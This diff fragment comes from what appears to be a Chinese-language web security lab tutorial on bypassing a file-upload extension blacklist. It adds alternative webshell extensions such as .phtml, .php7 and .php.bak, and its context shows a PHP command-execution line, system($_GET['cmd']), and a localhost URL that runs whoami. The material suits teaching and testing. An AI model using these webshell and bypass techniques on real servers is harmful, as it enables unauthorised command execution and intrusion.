@@ -100,6 +100,12 @@ system($_GET[&#39;cmd&#39;]);
                             <li><code>webshell.phar</code> - PHP归档文件</li>
                             <li><code>webshell.php.shtml</code> - 结合解析漏洞</li>
                             <li><code>webshell.pht</code> - 某些服务器会解析</li>
+                            <li><code>webshell.php7</code> - PHP 7+ 版本可能支持</li>
+                            <li><code>webshell.phtml</code> - 某些服务器会解析</li>
+                            <li><code>webshell.inc</code> - 某些配置下会被解析为PHP</li>
+                            <li><code>webshell.php~</code> - 波浪号后缀可能被忽略</li>
+                            <li><code>webshell.php.old</code> - 某些服务器会解析前面的.php</li>
+                            <li><code>webshell.php.bak</code> - 备份文件扩展名</li>
                         </ul>
                         <li>上传文件，由于扩展名不在黑名单中，会被成功上传</li>
                         <li>访问上传后的文件，例如：<code>http://localhost/zhaosec/upload/uploads/webshell.php5?cmd=whoami</code></li>
